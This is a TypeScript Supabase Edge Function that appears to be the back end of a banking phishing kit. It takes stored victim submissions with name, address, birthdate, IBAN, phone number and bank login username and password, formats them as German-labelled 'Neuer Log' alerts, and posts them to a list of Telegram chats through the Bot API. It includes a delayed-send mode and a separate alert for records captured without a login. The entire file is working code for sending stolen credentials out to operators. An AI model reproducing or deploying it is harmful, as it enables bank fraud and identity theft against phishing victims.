import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2/cors";

function formatLog(s: any): string {
  return `🔔 Neuer Log

fullname: ${s.full_name || ""}
email: ${s.email || ""}
city: ${s.city || ""}
street: ${s.street || ""}
housenumber: ${s.house_number || ""}
stiege: ${s.staircase || ""}
door: ${s.door_number || ""}
postcode: ${s.postal_code || ""}
birthdate: ${s.birthdate || ""}
iban: ${s.iban || ""}
phone: ${s.phone || ""}

======> LOGIN INFO <=======
benutzername: ${s.bank_username || ""}
passwort: ${s.bank_password || ""}
bank: ${s.bank || ""}`;
}

function formatFullInfo(s: any): string {
  return `🟡 Full Info (ohne Login)

fullname: ${s.full_name || ""}
email: ${s.email || ""}
city: ${s.city || ""}
street: ${s.street || ""}
housenumber: ${s.house_number || ""}
stiege: ${s.staircase || ""}
door: ${s.door_number || ""}
postcode: ${s.postal_code || ""}
birthdate: ${s.birthdate || ""}
iban: ${s.iban || ""}
phone: ${s.phone || ""}
bank: ${s.bank || ""}`;
}

async function sendToAllChats(
  supabase: any,
  botToken: string,
  text: string,
): Promise<number> {
  const { data: chatIds } = await supabase
    .from("telegram_chat_ids")
    .select("chat_id");

  if (!chatIds || chatIds.length === 0) return 0;

  let sent = 0;
  for (const { chat_id: cid } of chatIds) {
    const res = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: cid, text }),
      },
    );
    if (res.ok) sent++;
  }
  return sent;
}

async function processNotification(
  supabase: any,
  botToken: string,
  submission_id: string,
  kind: "full_info" | "log",
): Promise<{ ok: boolean; sent: number; reason?: string }> {
  // Atomic claim: only proceed if telegram_sent is still false
  const { data: claimed, error: claimErr } = await supabase
    .from("submissions")
    .update({ telegram_sent: true, notified_at: new Date().toISOString() })
    .eq("id", submission_id)
    .eq("telegram_sent", false)
    .select("*");

  if (claimErr || !claimed || claimed.length === 0) {
    return { ok: true, sent: 0, reason: "already_sent" };
  }

  const submission = claimed[0];

  // For full_info: skip if user has since entered login credentials
  if (kind === "full_info" && submission.bank_username) {
    return { ok: true, sent: 0, reason: "login_present" };
  }

  const text = kind === "log" ? formatLog(submission) : formatFullInfo(submission);
  const sent = await sendToAllChats(supabase, botToken, text);
  return { ok: true, sent };
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    const { submission_id, test, chat_id, kind = "log", delay_seconds = 0 } = body;

    const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
    if (!TELEGRAM_BOT_TOKEN) {
      return new Response(JSON.stringify({ error: "TELEGRAM_BOT_TOKEN not set" }), {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Test mode
    if (test && chat_id) {
      const res = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id,
            text: "✅ Telegram Bot verbunden! Benachrichtigungen sind aktiv.",
          }),
        },
      );
      const data = await res.json();
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: res.ok ? 200 : 400,
      });
    }

    if (!submission_id) {
      return new Response(JSON.stringify({ error: "submission_id required" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (kind !== "full_info" && kind !== "log") {
      return new Response(JSON.stringify({ error: "invalid kind" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Delayed processing in background
    if (delay_seconds > 0) {
      const task = (async () => {
        await new Promise((resolve) =>
          setTimeout(resolve, delay_seconds * 1000),
        );
        try {
          await processNotification(
            supabase,
            TELEGRAM_BOT_TOKEN,
            submission_id,
            kind,
          );
        } catch (e) {
          console.error("Delayed notification failed:", e);
        }
      })();

      // @ts-ignore - EdgeRuntime is available in Supabase Edge Functions
      if (typeof EdgeRuntime !== "undefined" && EdgeRuntime.waitUntil) {
        // @ts-ignore
        EdgeRuntime.waitUntil(task);
      }

      return new Response(
        JSON.stringify({ ok: true, scheduled: true, delay_seconds }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    const result = await processNotification(
      supabase,
      TELEGRAM_BOT_TOKEN,
      submission_id,
      kind,
    );

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
